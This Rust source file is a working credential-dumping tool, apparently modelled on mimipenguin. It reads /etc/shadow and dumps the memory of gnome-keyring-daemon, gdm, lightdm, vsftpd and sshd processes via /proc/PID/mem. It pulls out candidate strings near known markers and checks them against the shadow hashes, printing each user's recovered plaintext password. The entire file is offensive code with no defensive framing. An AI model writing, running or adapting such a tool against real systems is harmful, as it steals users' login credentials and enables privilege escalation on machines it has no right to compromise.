use std::collections::HashMap;
use std::path::Path;
use std::io::{ self, BufRead, Read, Seek };
use std::fs::{ self, File };
use pw_hash::unix;
use regex::Regex;

#[derive(Debug)]
struct User {
    username: String,
    hash: String,
    ctype: String,
    salt: String,
    plaintext: Option<String>,
}

#[derive(Debug)]
struct Region {
    start: u64,
    stop: u64,
}

fn read_lines(filename: &str) -> io::Result<io::Lines<io::BufReader<File>>> {
    let file = File::open(filename)?;
    Ok(io::BufReader::new(file).lines())
}

fn populate_user_db() -> Vec<User> {
    let mut users: Vec<User> = vec![];
    if let Ok(lines) = read_lines("/etc/shadow") {

        for line in lines.flatten() {
            if let Some(user) = parse_shadow_line(&line) { users.push(user) }
        }

    } else {
        println!("Failed to read shadow file!")
    }

    users
}

fn find_proc(proc_name: &str) -> Vec<u32> {
    let mut pids: Vec<u32> = vec![];

    // iterate through the /proc directory
    if let Ok(entries) = fs::read_dir("/proc") {
        for entry in entries.flatten() {
            if let Some(pid_str) = entry.file_name().to_str() {
                // pid should be numeric
                if pid_str.chars().all(|c| c.is_digit(10)) {
                    // read /proc/PID/cmdline
                    if let Ok(cmdline) = fs::read_to_string(Path::new(&format!("/proc/{}/cmdline", pid_str))) {
                        if cmdline.contains(proc_name) {
                            if let Ok(pid) = pid_str.parse::<u32>() {
                                pids.push(pid);
                            }
                        }
                    }
                }
            }
        }
    }

    pids
}

fn parse_map_line(line: &str) -> Option<Region> {
    let parts: Vec<&str> = line.split_whitespace().collect();

    // 562271f20000-562271f41000 r--p 00000000 08:05 262561 /usr/bin/gnome-keyring-daemon
    // 1                         2    3        4     5      6
    // should be at least addresses and permissions
    if parts.len() < 2 {
        return None;
    }

    // if permissions do not contain "r" (they are not readable)
    if !parts[1].contains('r') {
        return None;
    }

    // memory region address range
    let range: Vec<&str> = parts[0].split("-").collect();
    let start = u64::from_str_radix(range[0], 16).ok()?;
    let stop = u64::from_str_radix(range[1], 16).ok()?;

    Some(Region{start, stop})
}

fn parse_shadow_line(line: &str) -> Option<User> {
    // username:password:lastchg:min:max:warn:inactive:expire:reserved
    
    // split by :
    let parts: Vec<&str> = line.split(':').collect();
    
    if parts.len() < 2 {
        return None;
    }

    let username = parts[0].to_string();
    let password = parts[1].to_string();
    
    // "$1$salt$hash" for MD5
    // "$2a$salt$hash" for bcrypt
    let (ctype, salt, hash) = if password.starts_with('$') {
        let mut iter = password.split('$');
        let ctype = iter.nth(1).unwrap_or_default().to_string();
        let salt = iter.nth(0).unwrap_or_default().to_string();
        let hash = iter.nth(0).unwrap_or_default().to_string();
        (ctype, salt, hash)
    } else {
        (String::new(), String::new(), password)
    };

    if !ctype.is_empty() && !salt.is_empty() && !hash.is_empty() {
        Some(User {username, hash, ctype, salt, plaintext: None})
    } else {
        None
    }

}

fn get_regions(pid: &u32) -> Vec<Region> {
    let mut regions: Vec<Region> = vec![];
    if let Ok(lines) = read_lines(format!("/proc/{}/maps", pid).as_str()) {

        for line in lines.flatten() {
            if let Some(region) = parse_map_line(&line) { regions.push(region) }
        }

    } else {
        println!("Failed to read process file!")
    }

    regions
}

fn raw_dump(pid: &u32, regions: &Vec<Region>) -> Vec<u8> {
    let mut dump = Vec::new();

    for region in regions {
        if let Ok(mem_file) = File::open(format!("/proc/{}/mem", &pid)) {
            let mut mem_file = io::BufReader::new(mem_file); 

            mem_file.seek(io::SeekFrom::Start(region.start)).expect("FAILED TO FIND MEMORY START ADDRESS");
            let mut buffer = vec![0; (region.stop - region.start) as usize];
            if let Err(_) = mem_file.read_exact(&mut buffer) {
                continue;
            }
            dump.extend(buffer);
        }
    }

    dump
}

fn is_printable_ascii(byte: u8) -> bool {
    /*
    - is ascii AND is ascii, but not space or control char
    OR 
    - space, newline, carriage return (not considered graphic ASCII)
    */
    byte.is_ascii() && byte.is_ascii_graphic() || byte == b' ' || byte == b'\n' || byte == b'\r'
}

// this could probably be written better, but it was already mega difficult for me :sob:
fn extract_strings(data: &[u8], min_length: usize) -> Vec<String> {
    let mut ret = vec![];
    let mut current_string = vec![]; // building this string

    // for each byte in 
    for &byte in data {
        // if this byte can be translated into printable ASCII char THEN push to the string building vector
        if is_printable_ascii(byte) {
            current_string.push(byte);
        } else {
            // if not printable, then add to return vector if long enough
            if current_string.len() >= min_length {
                if let Ok(string) = String::from_utf8(current_string.clone()) {
                    ret.push(string);
                }
            }
            current_string.clear();
        }
    }

    // final one
    if current_string.len() >= min_length {
        if let Ok(string) = String::from_utf8(current_string) {
            ret.push(string);
        }
    }

    ret
}

fn dump(pids: &Vec<u32>) -> Vec<Vec<String>> {
    let mut readable_dumps: Vec<Vec<String>> = vec![];
    for pid in pids.iter() {
        let regions = get_regions(pid);
        let dump = raw_dump(pid, &regions);
        readable_dumps.push(extract_strings(&dump, 4));
    }
    readable_dumps
}

fn extract_potential_passwords(needles: &Vec<Regex>, strings_dump: &Vec<String>, pad: u32) -> Vec<String> {
    let mut potential_passwords: Vec<String> = vec![];
    let pad: usize = pad.try_into().unwrap_or(0);
    for needle in needles.iter() {
        for (index, s) in strings_dump.iter().enumerate() {
        // capturing n (pad) before and after around the needle
            if needle.is_match(s) {
                // index is where the match to the needle regex was found

                // if index is greater than the pad, then subtract the pad 
                // otherwise, the start index is 0
                let start = if index >= pad { index - pad } else { 0 };

                // if index + pad + 1 is less than the length of the vector, then the end index is index + pad + 1
                // otherwise, the end index is the length of the vector 
                let end = if index + pad + 1 < strings_dump.len() { index + pad + 1 } else { strings_dump.len() };
            
                // add all to potential password vector and return
                potential_passwords.extend_from_slice(&strings_dump[start..index]); // before
                potential_passwords.push(strings_dump[index].clone()); // needle match itself
                potential_passwords.extend_from_slice(&strings_dump[index + 1..end]); // after
            }
        }
    }

    potential_passwords
}

fn check_password(potential_password: &str, user: &User) -> bool {
    let full_hash = format!("${}${}${}", user.ctype, user.salt, user.hash);
    unix::verify(potential_password, &full_hash)
}

fn find_plaintext_passwords(proc_name: &str, patterns: Vec<&str>) -> Option<HashMap<String, String>> {
    println!("Scanning {} for plaintext passwords", proc_name);
    
    let pids = find_proc(proc_name);

    if pids.len() < 1 {
        return None
    }

    println!("Reading from PIDs: {:?}", &pids);
    
    let dumps: Vec<Vec<String>> = dump(&pids);
    
    let needles: Vec<Regex> = patterns
        .into_iter()
        .map(|pattern| Regex::new(pattern).expect("Invalid regex pattern"))
        .collect();
    
    let mut potential_passwords: Vec<String> = vec![];
    for dump in dumps.iter() {
        potential_passwords.extend(extract_potential_passwords(&needles, dump, 10));
    }
    
    let mut users: Vec<User> = populate_user_db();
    
    for user in users.iter_mut() {
        for potential_password in potential_passwords.iter() {
            if check_password(&potential_password, &user) {
                user.plaintext = Some(potential_password.to_string());
            }
        }
    }

    let mut user_passwords: HashMap<String, String> = HashMap::new();

    for user in users.iter().filter(|u| u.plaintext.is_some()) {
        let plaintext_password = user.plaintext.as_ref().unwrap();
        user_passwords.insert(user.username.clone(), plaintext_password.clone());
    }

    Some(user_passwords)
}

fn main() {

    if find_proc("gdm-password").len() > 0 {
        println!("[+] gdm-password PAM was used, searching for passwords");
        if let Some(results) = find_plaintext_passwords("gnome-keyring-daemon", vec![r"^_pammodutil_getpwnam_root_1$", r"^gkr_system_authtok$"]) {
            println!("[GDM-PASSWORD] Credential set found: {:?}", results);
        }
    }

    if find_proc("lightdm").len() > 0 {
        println!("[+] Found LIGHTDM, searching for passwords");
        if let Some(results) = find_plaintext_passwords("gnome-keyring-daemon", vec![r"^_pammodutil_getspnam_"]) {
            println!("[LIGHTDM] Credential set found: {:?}", results);
        }
    }

    if find_proc("gnome-keyring-daemon").len() > 0 {
        println!("[+] Keyring is running, searching for passwords");
        if let Some(results) = find_plaintext_passwords("gnome-keyring-daemon", vec![r"^.+libgck\-1\.so\.0$", r"libgcrypt\.so\..+$", r"linux-vdso\.so\.1$"]) {
            println!("[KEYRING] Credential set found: {:?}", results);
        }
    }

    if find_proc("vsftpd").len() > 0 {
        println!("[+] Found VSFTPd, searching for passwords");
        if let Some(results) =  find_plaintext_passwords("vsftpd", vec![r"^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$"]) {
            println!("[VSFTPD] Credential set found: {:?}", results);
        }
    }
    
    if find_proc("sshd:").len() > 0 {
        println!("[+] Found SSHD, searching for passwords");
        if let Some(results) =  find_plaintext_passwords("sshd:", vec![r"^sudo.+"]) {
            println!("[SSHD] Credential set found: {:?}", results);
        }
    }

}
